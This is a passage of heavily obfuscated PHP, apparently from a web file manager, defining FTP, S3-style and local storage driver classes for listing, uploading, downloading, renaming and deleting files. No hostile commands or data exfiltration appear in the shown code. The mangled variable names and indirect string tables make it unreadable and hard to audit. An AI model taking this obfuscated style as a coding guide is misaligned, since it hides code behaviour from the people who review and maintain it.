$ò’­«õ‹); $‰Ö•ğ™û = $this->getPathOuter($‰Ö•ğ™û); return $‰Ö•ğ™û; } public function pathThis($ÕÈØ¨áò) { return get_path_this($this->pathParse[$_SERVER[¡¬ıÜ ƒ][87]]); } public function pathFather($¾›¬Ì•¼) { return get_path_father($this->pathParse[$_SERVER[¡¬ıÜ ƒ][87]]); } public function iconvSystem($ˆ¸ü´Œ‹) { return $ˆ¸ü´Œ‹; } protected function infoParse($Ûúüîı“, $ „Ò¶ = false) { $¨Ê°Ç› =& $_SERVER[¡¬ıÜ ƒ]; $œúß™Äµ = $this->pathParse[$¨Ê°Ç›[562]][$¨Ê°Ç›[1268]] . $this->pathParse[$¨Ê°Ç›[1261]]; if ($ „Ò¶) { $Ù¥àìñ = IO::infoWithChildren($œúß™Äµ); } else { $Ù¥àìñ = IO::info($œúß™Äµ); } $Ê©Å¤œ§ = $this->pathParse[$¨Ê°Ç›[562]]; return Action($¨Ê°Ç›[1439])->_shareItemeParse($Ù¥àìñ, $Ê©Å¤œ§); } public function listAll($ÀŠ¤ùİ) { $…ìÕÂ”¾ =& $_SERVER[¡¬ıÜ ƒ]; $èÀğ°ÑÖ = IO::listAll($ÀŠ¤ùİ); $³ù€Ë¢ = rtrim($this->pathParse[$…ìÕÂ”¾[562]][$…ìÕÂ”¾[1268]], $…ìÕÂ”¾[8]); foreach ($èÀğ°ÑÖ as &$Ïœ«³½“) { $Ïœ«³½“[$…ìÕÂ”¾[87]] = $this->pathDriver . $…ìÕÂ”¾[8] . ltrim(substr($Ïœ«³½“[$…ìÕÂ”¾[87]], strlen($³ù€Ë¢)), $…ìÕÂ”¾[8]); } unset($Ïœ«³½“); return $èÀğ°ÑÖ; } public function listAllSimple($¢ßÆÃû¹, $æ’ÆÖ· = false) { $åÜ¾«íâ =& $_SERVER[¡¬ıÜ ƒ]; $™É¼ŠÂ = $this->listAll($¢ßÆÃû¹); $É·”Œ²® = $this->pathParse[$åÜ¾«íâ[497]]; if (trim($É·”Œ²®, $åÜ¾«íâ[8]) == trim(get_path_father($É·”Œ²®), $åÜ¾«íâ[8])) { $æ’ÆÖ· = !0; } return IO::init($åÜ¾«íâ[12])->listAllSimpleMake($™É¼ŠÂ, $É·”Œ²®, $æ’ÆÖ·); } public function getPathOuter($şö·Ïëö) { $·ªÂò Â =& $_SERVER[¡¬ıÜ ƒ]; $ë¹¸æ¦ƒ = KodIO::parse($şö·Ïëö); if ($ë¹¸æ¦ƒ[$·ªÂò Â[33]] == KodIO::KOD_SHARE_ITEM) { return $ë¹¸æ¦ƒ[$·ªÂò Â[87]]; } $èŠßËÈ = KodIO::clear($şö·Ïëö); $Øî¦ó¯ù = KodIO::clear($this->pathParse[$·ªÂò Â[562]][$·ªÂò Â[1268]]); $Åï÷§Í = substr($èŠßËÈ, strlen($Øî¦ó¯ù)); if (substr($èŠßËÈ, 0, strlen($Øî¦ó¯ù)) != $Øî¦ó¯ù) { return !1; } return $this->pathParse[$·ªÂò Â[1262]] . $·ªÂò Â[8] . ltrim($Åï÷§Í, $·ªÂò Â[8]); } public function getType() { $ãÜöÀÊ =& $_SERVER[¡¬ıÜ ƒ]; $‡Ø—Ûüµ = str_replace($ãÜöÀÊ[77], $ãÜöÀÊ[12], get_class($this)); return strtolower($‡Ø—Ûüµ); } public function isOsDriver($ÊÕëİ¼») { return IO::isOsDriver($ÊÕëİ¼»); } public function info($ãáÊ¸¥ğ) { return $this->infoParse($ãáÊ¸¥ğ); } public function infoAuth($ÄˆƒÑ¡³) { return $this->infoParse($ÄˆƒÑ¡³); } public function infoWithChildren($¼ ³ùÇ§) { return $this->infoParse($¼ ³ùÇ§, !0); } public function infoFull($ã–¼à¢€) { return $this->infoParse($ã–¼à¢€); } } goto F¡Õö„ØŞ¸; Cİìî²‹·: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($–úäƒäí) { parent::__construct(); if (count($–úäƒäí) > 0) { $this->_init($–úäƒäí); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ßÅŸ®Ü) { $‘ì¾å¡ =& $_SERVER[¡¬ıÜ ƒ]; global $config; $this->appCharset = $config[$‘ì¾å¡[1450]]; $this->systemCharset = $config[$‘ì¾å¡[1451]]; if (isset($ßÅŸ®Ü[$‘ì¾å¡[1452]]) && $ßÅŸ®Ü[$‘ì¾å¡[1452]]) { $this->systemCharset = $ßÅŸ®Ü[$‘ì¾å¡[1452]]; } } public function iconvApp($Å¦ÉœÆ) { return $this->iconvTo($Å¦ÉœÆ, $this->systemCharset, $this->appCharset); } public function iconvSystem($ŸÕ´‘‚) { return $this->iconvTo($ŸÕ´‘‚, $this->appCharset, $this->systemCharset); } public function getPathOuter($®äö°øë) { $×°’£•” =& $_SERVER[¡¬ıÜ ƒ]; $Òğàîûİ = $this->iconvApp($this->pathBase); $®äö°øë = $this->iconvApp($®äö°øë); if (substr($Òğàîûİ, 0, 2) == $×°’£•”[1422]) { $Òğàîûİ = BASIC_PATH . substr($Òğàîûİ, 2); } if (substr($®äö°øë, 0, 2) == $×°’£•”[1422]) { $®äö°øë = BASIC_PATH . substr($®äö°øë, 2); } $Òğàîûİ = KodIO::clear($Òğàîûİ); $®äö°øë = KodIO::clear($®äö°øë); $®äö°øë = substr($®äö°øë, strlen($Òğàîûİ)); if (empty($this->pathDriver)) { return $®äö°øë; } return $this->pathDriver . $×°’£•”[8] . ltrim($®äö°øë, $×°’£•”[8]); } private function _init($ËåºïÓ = array()) { $»‘ÑÀ‡ =& $_SERVER[¡¬ıÜ ƒ]; if (!function_exists($»‘ÑÀ‡[1453])) { throw new Exception(LNG($»‘ÑÀ‡[1454])); } $this->config = $ËåºïÓ; $this->charsetReset($ËåºïÓ); foreach ($ËåºïÓ as $ˆ‘‘«õ => $öúÅ—) { if (isset($this->{$ˆ‘‘«õ})) { $this->{$ˆ‘‘«õ} = $öúÅ—; } } return $this->_login($ËåºïÓ); } private function _login($å‹½ïä) { $èéµô‘² =& $_SERVER[¡¬ıÜ ƒ]; static $åıÂ‡Œ† = array(); $ëÚ½Õ€œ = md5(json_encode($å‹½ïä)); if (isset($åıÂ‡Œ†[$ëÚ½Õ€œ])) { foreach ($åıÂ‡Œ†[$ëÚ½Õ€œ] as $ß¬‡½”± => $´¨¶ÌŸË) { $this->{$ß¬‡½”±} = $´¨¶ÌŸË; } return !0; } $íÜú´¡¿ = parse_url(trim($this->server, $èéµô‘²[8])); $this->host = $íÜú´¡¿[$èéµô‘²[208]]; $»ÃÇçî¥ = isset($íÜú´¡¿[$èéµô‘²[207]]) && $íÜú´¡¿[$èéµô‘²[207]] == $èéµô‘²[1455] ? !0 : !1; $this->scheme = $»ÃÇçî¥ ? $èéµô‘²[1456] : $èéµô‘²[1457]; $this->port = isset($íÜú´¡¿[$èéµô‘²[209]]) ? $íÜú´¡¿[$èéµô‘²[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($èéµô‘²[1458]) . $this->host . $èéµô‘²[4] . $this->port, !0); return !1; } $å¦ÖûÌü = @ftp_login($this->connect, $this->username, $this->userpass); if (!$å¦ÖûÌü) { $this->writeLog(LNG($èéµô‘²[1459]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¸Ä•ˆˆÅ = $this->pasv == $èéµô‘²[91] ? !0 : !1; @ftp_pasv($this->connect, $¸Ä•ˆˆÅ); $åıÂ‡Œ†[$ëÚ½Õ€œ] = array($èéµô‘²[1460] => $this->connect, $èéµô‘²[208] => $this->host, $èéµô‘²[207] => $this->scheme, $èéµô‘²[209] => $this->port); return $å¦ÖûÌü; } private function _isconn($ˆ³ø®¼ = true) { if (is_resource($this->connect)) { return !0; } if (!$ˆ³ø®¼) { return !1; } return $this->_login($this->config); } public function mkfile($êğâ„»É, $§úç­ = '', $å¡ÀêÀ¶ = REPEAT_RENAME) { if ($this->setContent($êğâ„»É, $§úç­)) { return $this->getPathOuter($êğâ„»É); } $this->writeLog(LNG($_SERVER[¡¬ıÜ ƒ][1461]), !0); return !1; } public function mkdir($×ÁİõÈ­, $áÀõãù° = REPEAT_SKIP) { $ÙÖòˆå™ =& $_SERVER[¡¬ıÜ ƒ]; if (!$×ÁİõÈ­ || $×ÁİõÈ­ == $ÙÖòˆå™[8]) { return !0; } if (!$this->_isconn()) { return !1; } $×ÁİõÈ­ = $this->iconvSystem($×ÁİõÈ­); if ($this->_isFolder($×ÁİõÈ­) || @ftp_mkdir($this->connect, $×ÁİõÈ­)) { return $this->getPathOuter($×ÁİõÈ­); } if (!$this->mkdir($this->pathFather($×ÁİõÈ­))) { return !1; } if ($×ÁİõÈ­ = @ftp_mkdir($this->connect, $×ÁİõÈ­)) { return $this->getPathOuter($×ÁİõÈ­); } $this->writeLog(__FUNCTION__ . $ÙÖòˆå™[1462], !0); return !1; } public function copyFile($ã›ä†Æ®, $•ô‚¹Òã) { if (!$this->_isconn()) { return !1; } $ŠÕ¦ä¨ä = $this->pathThis($this->iconvSystem($ã›ä†Æ®)); $‡Š°°È = $this->tempFile($ŠÕ¦ä¨ä); $™ñì‹ÃØ = $this->iconvApp($‡Š°°È); $this->download($ã›ä†Æ®, $™ñì‹ÃØ); $•‚ÁÜâÄ = $this->upload($•ô‚¹Òã, $™ñì‹ÃØ); $this->tempFileRemve($‡Š°°È); return $•‚ÁÜâÄ; } public function moveFile($àëöú§³, $õ…¸Îİ) { if (!$this->_isconn()) { return !1; } $àëöú§³ = $this->iconvSystem($àëöú§³); $õ…¸Îİ = $this->iconvSystem($õ…¸Îİ); $µÍÌæõ® = @ftp_rename($this->connect, $àëöú§³, $õ…¸Îİ); if (!$µÍÌæõ®) { $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][1462], !0); return !1; } return $this->getPathOuter($õ…¸Îİ); } public function delFile($ŒØœ»ü) { if (!$this->_isconn()) { return !1; } $ŒØœ»ü = $this->iconvSystem($ŒØœ»ü); $ÄÒ‡”Ö = @ftp_delete($this->connect, $ŒØœ»ü); if (!$ÄÒ‡”Ö) { $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][1462], !0); } return $ÄÒ‡”Ö; } public function delFolder($ùà‡ùÂÊ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¤Ñ„‚„À = $ş»×—Æ÷ = array(); $this->fileList($ùà‡ùÂÊ, $¤Ñ„‚„À, $ş»×—Æ÷, !0); $this->listItemCache = !0; foreach ($ş»×—Æ÷ as $ûÇ¾¹¸°) { $âÇÙÖõ = $this->iconvSystem($ûÇ¾¹¸°[$_SERVER[¡¬ıÜ ƒ][32]]); $¦ ¡©¥ = @ftp_delete($this->connect, $âÇÙÖõ); if (!$¦ ¡©¥) { return !1; } } foreach ($¤Ñ„‚„À as $âÇÙÖõ) { $âÇÙÖõ = $this->iconvSystem($âÇÙÖõ); $¦ ¡©¥ = @ftp_rmdir($this->connect, $âÇÙÖõ); if (!$¦ ¡©¥) { return !1; } } $ùà‡ùÂÊ = $this->iconvSystem($ùà‡ùÂÊ); return @ftp_rmdir($this->connect, $ùà‡ùÂÊ); } public function rename($ª»˜ŸÛá, $øôå¶÷Á) { $Éš©…÷Ş =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->_isconn()) { return !1; } $÷ìš¦¢× = $this->fileNameAuto($this->pathFather($ª»˜ŸÛá), $øôå¶÷Á); $÷ìš¦¢× = $this->iconvSystem($÷ìš¦¢×); $ª»˜ŸÛá = $this->iconvSystem($ª»˜ŸÛá); $öÊ¯Ü”Ş = $this->pathFather($ª»˜ŸÛá); $÷îÌ§îÇ = rtrim($öÊ¯Ü”Ş, $Éš©…÷Ş[8]) . $Éš©…÷Ş[8] . $÷ìš¦¢×; $ÁÏœ¹©¦ = @ftp_rename($this->connect, $ª»˜ŸÛá, $÷îÌ§îÇ); if (!$ÁÏœ¹©¦) { $this->writeLog(__FUNCTION__ . $Éš©…÷Ş[1462], !0); return !1; } $÷îÌ§îÇ = $this->iconvApp($÷îÌ§îÇ); return $this->getPathOuter($÷îÌ§îÇ); } private function folderInfo($É¾î’ÓÈ, $ÈÔâ²ö = false) { $› ©Şø‚ =& $_SERVER[¡¬ıÜ ƒ]; $¬²ÉÉ = array($› ©Şø‚[32] => $this->pathThis($É¾î’ÓÈ), $› ©Şø‚[87] => $this->getPathOuter($› ©Şø‚[8] . $É¾î’ÓÈ), $› ©Şø‚[33] => $› ©Şø‚[78]); if ($ÈÔâ²ö) { return $¬²ÉÉ; } $¬²ÉÉ[$› ©Şø‚[233]] = $¬²ÉÉ[$› ©Şø‚[88]] = 0; $¬²ÉÉ[$› ©Şø‚[234]] = $¬²ÉÉ[$› ©Şø‚[235]] = !0; return $¬²ÉÉ; } private function fileInfo($ÑØ¡˜©, $ñ©ÛÖÅ  = false, $ãËòÏÍ = array()) { $ºúÃÏ†à =& $_SERVER[¡¬ıÜ ƒ]; $‰áî„í = array($ºúÃÏ†à[32] => $this->pathThis($ÑØ¡˜©), $ºúÃÏ†à[87] => $this->getPathOuter($ºúÃÏ†à[8] . $ÑØ¡˜©), $ºúÃÏ†à[33] => $ºúÃÏ†à[232], $ºúÃÏ†à[79] => isset($ãËòÏÍ[$ºúÃÏ†à[79]]) ? $ãËòÏÍ[$ºúÃÏ†à[79]] : 0, $ºúÃÏ†à[169] => $this->ext($ÑØ¡˜©)); if ($ñ©ÛÖÅ ) { return $‰áî„í; } $‰áî„í[$ºúÃÏ†à[233]] = $‰áî„í[$ºúÃÏ†à[88]] = 0; $‰áî„í[$ºúÃÏ†à[234]] = $‰áî„í[$ºúÃÏ†à[235]] = !0; $¥’—ºĞÜ = $this->iconvSystem($ÑØ¡˜©); $‰áî„í[$ºúÃÏ†à[88]] = @ftp_mdtm($this->connect, $¥’—ºĞÜ); if (empty($ãËòÏÍ)) { $ãËòÏÍ = $this->objectMeta($ÑØ¡˜©); if (!$ãËòÏÍ) { return $‰áî„í; } } $‰áî„í[$ºúÃÏ†à[79]] = $ãËòÏÍ[$ºúÃÏ†à[79]]; return $‰áî„í; } public function size($Ú¯×‡Úö) { $àğö«ó¸ = $this->objectMeta($Ú¯×‡Úö); return $àğö«ó¸ ? $àğö«ó¸[$_SERVER[¡¬ıÜ ƒ][79]] : 0; } public function info($ó©´¯äë) { if ($this->isFile($ó©´¯äë)) { return $this->fileInfo($ó©´¯äë, 0); } else { if ($this->isFolder($ó©´¯äë)) { return $this->folderInfo($ó©´¯äë); } } return !1; } private function fileList($ø½ÆÆÎÈ, &$Ôµš£¬¢, &$çşŠĞ Ø, $à»µµñ = false) { $Î´á›˜ù =& $_SERVER[¡¬ıÜ ƒ]; $ø½ÆÆÎÈ = $this->iconvSystem($ø½ÆÆÎÈ); if (!$this->isFolder($ø½ÆÆÎÈ)) { return !1; } @ftp_chdir($this->connect, $Î´á›˜ù[8]); $ø½ÆÆÎÈ = rtrim($ø½ÆÆÎÈ, $Î´á›˜ù[8]) . $Î´á›˜ù[8]; check_abort(); $ä·Í = @ftp_rawlist($this->connect, $ø½ÆÆÎÈ); if (!$ä·Í) { $ä·Í = array(); } $ïŸ˜ÎÛÖ = array($Î´á›˜ù[10] => 1, $Î´á›˜ù[1374] => 1); foreach ($ä·Í as $’‡Á–) { $‹å‘êĞº = $this->_listItem($’‡Á–); if ($‹å‘êĞº[0] == $Î´á›˜ù[838]) { continue; } $ÖÔ¥©—¤ = $‹å‘êĞº[8]; if (empty($ÖÔ¥©—¤) && $ÖÔ¥©—¤ !== $Î´á›˜ù[230] || isset($ïŸ˜ÎÛÖ[$ÖÔ¥©—¤])) { continue; } $ÖÔ¥©—¤ = $this->iconvApp($ø½ÆÆÎÈ . ltrim($ÖÔ¥©—¤, $Î´á›˜ù[8])); $µà‡• = array($Î´á›˜ù[32] => $ÖÔ¥©—¤, $Î´á›˜ù[33] => $Î´á›˜ù[232], $Î´á›˜ù[79] => $‹å‘êĞº[4]); if (substr($’‡Á–, 0, 1) == $Î´á›˜ù[1463]) { $µà‡•[$Î´á›˜ù[33]] = $Î´á›˜ù[78]; $µà‡•[$Î´á›˜ù[79]] = 0; } $®Å¯‹¯ = $µà‡•[$Î´á›˜ù[33]] == $Î´á›˜ù[78] ? !0 : !1; $this->cacheMethodInfoSet($ÖÔ¥©—¤, $®Å¯‹¯, $µà‡•); if ($®Å¯‹¯) { $Ôµš£¬¢[] = $ÖÔ¥©—¤; if ($à»µµñ) { $this->fileList($ÖÔ¥©—¤, $Ôµš£¬¢, $çşŠĞ Ø, $à»µµñ); } continue; } $çşŠĞ Ø[] = $µà‡•; } $this->cacheMethodInfoSet($ø½ÆÆÎÈ, !0); } private function _listItem($Ò •æŸ) { if (empty($Ò •æŸ)) { return array(); } $Èè©“©å = preg_split($_SERVER[¡¬ıÜ ƒ][1464], $Ò •æŸ); if (count($Èè©“©å) <= 9) { return $Èè©“©å; } $Èè©“©å[8] = trim(substr($Ò •æŸ, strpos($Ò •æŸ, $Èè©“©å[7]) + strlen($Èè©“©å[7]))); return array_splice($Èè©“©å, 0, 9); } public function listPath($‚Ç€Çôß, $Åí‰ª×€ = false) { $ëª­¸Æ =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->_isconn()) { return !1; } $Êá¢ÕüŞ = $Ç©»Ğù™ = array(); $this->fileList($‚Ç€Çôß, $Êá¢ÕüŞ, $Ç©»Ğù™); foreach ($Êá¢ÕüŞ as $ô‰¼à½ù => $ÔşÍã) { $Êá¢ÕüŞ[$ô‰¼à½ù] = $this->folderInfo($ÔşÍã, $Åí‰ª×€); } foreach ($Ç©»Ğù™ as $ô‰¼à½ù => $ÔşÍã) { $Ç©»Ğù™[$ô‰¼à½ù] = $this->fileInfo($ÔşÍã[$ëª­¸Æ[32]], $Åí‰ª×€, $ÔşÍã); } return array($ëª­¸Æ[85] => $Êá¢ÕüŞ, $ëª­¸Æ[86] => $Ç©»Ğù™); } public function has($Çö–œØÄ, $©ºß­„¸ = false, $“¸ô†šÈ = true) { $şà“ëòÂ =& $_SERVER[¡¬ıÜ ƒ]; $¹Œ®†Æ¡ = $Œ’›Ùì‹ = array(); $øºØÎË² = $©ºß­„¸ ? !0 : !1; $this->fileList($Çö–œØÄ, $¹Œ®†Æ¡, $Œ’›Ùì‹, $øºØÎË²); if ($©ºß­„¸) { return array($şà“ëòÂ[241] => count($Œ’›Ùì‹), $şà“ëòÂ[242] => count($¹Œ®†Æ¡)); } if ($“¸ô†šÈ) { if (count($Œ’›Ùì‹)) { return !0; } } else { if (count($¹Œ®†Æ¡)) { return !0; } } return !1; } public function listAll($¿äû¹àù) { $Ñää‹‡ =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->_isconn()) { return !1; } $ğÎ„ïüİ = $Ÿ„ŸÀÙ­ = array(); $this->fileList($¿äû¹àù, $ğÎ„ïüİ, $Ÿ„ŸÀÙ­, !0); $¬öÌ‘œÕ = array_to_keyvalue($Ÿ„ŸÀÙ­, $Ñää‹‡[32]); foreach ($ğÎ„ïüİ as $±ÇÄ®ŒÄ) { if (is_string($±ÇÄ®ŒÄ)) { $¬öÌ‘œÕ[$±ÇÄ®ŒÄ] = array($Ñää‹‡[79] => 0); } } return $this->listAllFiles($¿äû¹àù, $¬öÌ‘œÕ); } public function getContent($óÎŠÁ“•) { if (!$this->_isconn()) { return !1; } $óÎŠÁ“• = $this->iconvSystem($óÎŠÁ“•); return $this->fileSubstr($óÎŠÁ“•); } public function setContent($ŸóĞìÁ×, $¬¢ñù÷ù = '') { if (!$this->_isconn()) { return !1; } $Ò¢ü…õğ = $this->pathThis($this->iconvSystem($ŸóĞìÁ×)); $¼Éâ‚ñ = $this->tempFile($Ò¢ü…õğ); file_put_contents($¼Éâ‚ñ, $¬¢ñù÷ù); $¸Œû³¸ı = $this->upload($ŸóĞìÁ×, $this->iconvApp($¼Éâ‚ñ)); $this->tempFileRemve($¼Éâ‚ñ); return $¸Œû³¸ı; } public function fileSubstr($úŠ¯Ã­™, $Êş¨Ïİ = 0, $¾ØÚ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($úŠ¯Ã­™, $Êş¨Ïİ, $¾ØÚ); } private function ftpRequest($‚œ­úæ®, $˜ş¯÷‘º = 0, $§ÇÏİß¡ = false) { $‚œ­úæ® = $this->iconvSystem($‚œ­úæ®); $ÛÉÂÔî÷ = $this->scheme . $this->host . $_SERVER[¡¬ıÜ ƒ][4] . $this->port; $ˆË­ŒÇì = curl_init(); curl_setopt($ˆË­ŒÇì, CURLOPT_URL, $ÛÉÂÔî÷ . $this->pathEncode($‚œ­úæ®)); curl_setopt($ˆË­ŒÇì, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($§ÇÏİß¡) { $¢ëˆÆ¨´ = $˜ş¯÷‘º + $§ÇÏİß¡ - 1; curl_setopt($ˆË­ŒÇì, CURLOPT_RANGE, "{$˜ş¯÷‘º}\x2d{$¢ëˆÆ¨´}"); } curl_setopt($ˆË­ŒÇì, CURLOPT_RETURNTRANSFER, 1); $óµèŞ•¿ = curl_exec($ˆË­ŒÇì); curl_close($ˆË­ŒÇì); return $óµèŞ•¿; } public function upload($Ÿ÷øè±ò, $˜û´ò’Ö, $±Á—œ›‚ = false, $•«ò¾ÔĞ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Ÿ÷øè±ò))) { return !1; } $Ÿ÷øè±ò = $this->iconvSystem($Ÿ÷øè±ò); $˜û´ò’Ö = $this->iconvSystem($˜û´ò’Ö); $í›î–‡ = ftp_nb_put($this->connect, $Ÿ÷øè±ò, $˜û´ò’Ö, FTP_BINARY); while ($í›î–‡ == FTP_MOREDATA) { $í›î–‡ = ftp_nb_continue($this->connect); } if ($í›î–‡ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][1462], !0); return !1; } return $this->getPathOuter($Ÿ÷øè±ò); } public function download($…ñÛÙœ, $µÉ—Ë¶ƒ = '') { if (!$this->_isconn()) { return !1; } $š´ğ©ú = $this->pathFather($µÉ—Ë¶ƒ); if (!IO::mkdir($š´ğ©ú)) { return !1; } $…ñÛÙœ = $this->iconvSystem($…ñÛÙœ); $µÉ—Ë¶ƒ = $this->iconvSystem($µÉ—Ë¶ƒ); $İ¼–‡õõ = ftp_nb_get($this->connect, $µÉ—Ë¶ƒ, $…ñÛÙœ, FTP_BINARY); while ($İ¼–‡õõ == FTP_MOREDATA) { $İ¼–‡õõ = ftp_nb_continue($this->connect); } if ($İ¼–‡õõ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][1462], !0); return !1; } return $this->iconvApp($µÉ—Ë¶ƒ); } public function exist($âıûã‚) { return $this->isFile($âıûã‚) || $this->isFolder($âıûã‚); } public function isFile($©Ú­ÜÜ) { return !$this->isFolder($©Ú­ÜÜ) && $this->objectMeta($©Ú­ÜÜ); } public function isFolder($®®„Ïó) { return $this->cacheMethod($_SERVER[¡¬ıÜ ƒ][179], $®®„Ïó); } protected function objectMeta($“‚³‘¡ ) { return $this->cacheMethod($_SERVER[¡¬ıÜ ƒ][181], $“‚³‘¡ ); } protected function _objectMeta($Ö–ˆÍ€) { $˜ŞŒÏæŠ =& $_SERVER[¡¬ıÜ ƒ]; if ($Ö–ˆÍ€ == $˜ŞŒÏæŠ[12] || $Ö–ˆÍ€ == $˜ŞŒÏæŠ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ö–ˆÍ€ = $this->iconvSystem($Ö–ˆÍ€); $ğËŸ®³¼ = array($˜ŞŒÏæŠ[32] => $this->iconvApp($Ö–ˆÍ€), $˜ŞŒÏæŠ[33] => $˜ŞŒÏæŠ[232], $˜ŞŒÏæŠ[79] => 0); @ftp_chdir($this->connect, $˜ŞŒÏæŠ[8]); $©å¹ú’ = @ftp_size($this->connect, $Ö–ˆÍ€); if ($©å¹ú’ != -1) { $ğËŸ®³¼[$˜ŞŒÏæŠ[79]] = $©å¹ú’; } else { $“Ì—€ïÅ = @ftp_chdir($this->connect, $Ö–ˆÍ€); if (!$“Ì—€ïÅ) { return !1; } $ğËŸ®³¼[$˜ŞŒÏæŠ[33]] = $˜ŞŒÏæŠ[78]; } return $ğËŸ®³¼; } protected function _isFolder($£øûÒ¸€) { $ïôÅÉê =& $_SERVER[¡¬ıÜ ƒ]; if ($£øûÒ¸€ == $ïôÅÉê[12] || $£øûÒ¸€ == $ïôÅÉê[8]) { return !0; } $×¬ÄÎÚÇ = $this->_objectMeta($£øûÒ¸€); return isset($×¬ÄÎÚÇ[$ïôÅÉê[33]]) && $×¬ÄÎÚÇ[$ïôÅÉê[33]] == $ïôÅÉê[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($‡³¸İ©÷) { parent::__construct($‡³¸İ©÷); $this->setSignVersion($_SERVER[¡¬ıÜ ƒ][249]); } public function uploadLink($òñ„¨ à, $Æ›¹®¸˜ = 0) { $¡¡áœ°ú =& $_SERVER[¡¬ıÜ ƒ]; if ($this->isUploadServer()) { return; } $´Îôæ¸Ø = $this->getType(); if (!in_array($´Îôæ¸Ø, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $êİ¸â¹‹ = (!$Æ›¹®¸˜ ? 1 : ceil($Æ›¹®¸˜ / pow(1024, 3))) * 3600 * 4; $Í¢à ˜ = $this->uploadMultiData($òñ„¨ à, $êİ¸â¹‹); if ($Í¢à ˜) { $Í¢à ˜[$¡¡áœ°ú[97]] = $òñ„¨ à; $Í¢à ˜[$¡¡áœ°ú[98]] = $´Îôæ¸Ø; } return $Í¢à ˜; } public function fileOutImage($Ç¦ú±çÉ, $Şœöü¡Ç = 250) { if ($this->size($Ç¦ú±çÉ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ç¦ú±çÉ, $Şœöü¡Ç); } $Ê˜âäø‚ = $this->link($Ç¦ú±çÉ); $Ê˜âäø‚ .= $_SERVER[¡¬ıÜ ƒ][1465] . $Şœöü¡Ç; $this->fileOutLink($Ê˜âäø‚); } public function fileOutLink($Æ«ŠÜ¬) { $ºÜğ–£ğ =& $_SERVER[¡¬ıÜ ƒ]; if (substr($Æ«ŠÜ¬, 0, 7) == $ºÜğ–£ğ[218]) { $Æ«ŠÜ¬ = $ºÜğ–£ğ[219] . substr($Æ«ŠÜ¬, 7); } header($ºÜğ–£ğ[175] . $Æ«ŠÜ¬); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Ô¥åÒÍ) { if (substr($Ô¥åÒÍ, 0, 2) == $_SERVER[¡¬ıÜ ƒ][1422]) { $Ô¥åÒÍ = BASIC_PATH . substr($Ô¥åÒÍ, 2); } return $Ô¥åÒÍ; } public function iconvApp($¢ÜœŠÓë) { $é×²±ù =& $_SERVER[¡¬ıÜ ƒ]; global $config; return $this->iconvTo($¢ÜœŠÓë, $config[$é×²±ù[1451]], $config[$é×²±ù[1450]]); } public function iconvSystem($åŠŠŠå¼) { $‹«Ö¦´© =& $_SERVER[¡¬ıÜ ƒ]; global $config; return $this->iconvTo($åŠŠŠå¼, $config[$‹«Ö¦´©[1450]], $config[$‹«Ö¦´©[1451]]); } public function getPathOuter($˜­Òœ¡) { $¾Ææ—† =& $_SERVER[¡¬ıÜ ƒ]; $ îæ×Ò‹ = $this->iconvApp($this->pathBase); $˜­Òœ¡ = $this->iconvApp($˜­Òœ¡); if (substr($ îæ×Ò‹, 0, 2) == $¾Ææ—†[1422]) { $ îæ×Ò‹ = BASIC_PATH . substr($ îæ×Ò‹, 2); } if (substr($˜­Òœ¡, 0, 2) == $¾Ææ—†[1422]) { $˜­Òœ¡ = BASIC_PATH . substr($˜­Òœ¡, 2); } $ îæ×Ò‹ = KodIO::clear($ îæ×Ò‹); $˜­Òœ¡ = KodIO::clear($˜­Òœ¡); $˜­Òœ¡ = substr($˜­Òœ¡, strlen($ îæ×Ò‹)); if (empty($this->pathDriver)) { return $˜­Òœ¡; } return $this->pathDriver . $¾Ææ—†[8] . ltrim($˜­Òœ¡, $¾Ææ—†[8]); } public function mkfile($¿±”“éÒ, $´ˆ÷Û‚Ø = '', $Ë”øçØÅ = REPEAT_RENAME) { $¿±”“éÒ = $this->iconvSystem($¿±”“éÒ); @touch($¿±”“éÒ); if ($´ˆ÷Û‚Ø) { file_put_contents($¿±”“éÒ, $´ˆ÷Û‚Ø); } @chmod($¿±”“éÒ, $this->pathAuth); if (is_file($¿±”“éÒ)) { return $this->getPathOuter($¿±”“éÒ); } $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][1462], !0); return !1; } public function mkdir($¹íõ½¹, $¾†¶ßß = REPEAT_SKIP) { $¹íõ½¹ = $this->iconvSystem($¹íõ½¹); if (is_dir($¹íõ½¹)) { return $this->getPathOuter($¹íõ½¹); } @mkdir($¹íõ½¹, $this->pathAuth, !0); @chmod($¹íõ½¹, $this->pathAuth); if (is_dir($¹íõ½¹)) { return $this->getPathOuter($¹íõ½¹); } $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][1462], !0); return !1; } public function copyFile($üİáƒ°ş, $ÌŒñÜÍö) { $this->mkdir($this->pathFather($ÌŒñÜÍö)); $üİáƒ°ş = $this->iconvSystem($üİáƒ°ş); $ÌŒñÜÍö = $this->iconvSystem($ÌŒñÜÍö); $×“éÆ†¾ = copy_64($üİáƒ°ş, 